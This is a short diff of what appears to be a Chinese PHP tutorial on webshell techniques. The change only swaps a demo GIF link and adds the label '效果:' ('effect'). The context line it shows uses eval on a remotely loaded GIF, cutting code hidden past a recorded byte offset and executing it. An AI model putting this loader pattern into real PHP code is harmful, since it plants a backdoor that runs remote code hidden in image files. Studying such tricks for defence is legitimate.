@@ -299,7 +299,8 @@ echo substr("Hi!s9mf",3);
                                     //远程加载的gif             //293930是刚才记录的文件长度
 eval(trim(substr(file_get_contents("http://localhost/test/k.gif"),293930)));
 ```
-![27](https://ws1.sinaimg.cn/large/006VEsyOgy1g0s7d6khzyg30qb0l87wi.gif)
+效果:
+![27](https://ws1.sinaimg.cn/large/006VEsyOgy1g0s7jynbf6g30q20istsz.gif)
 
  
 
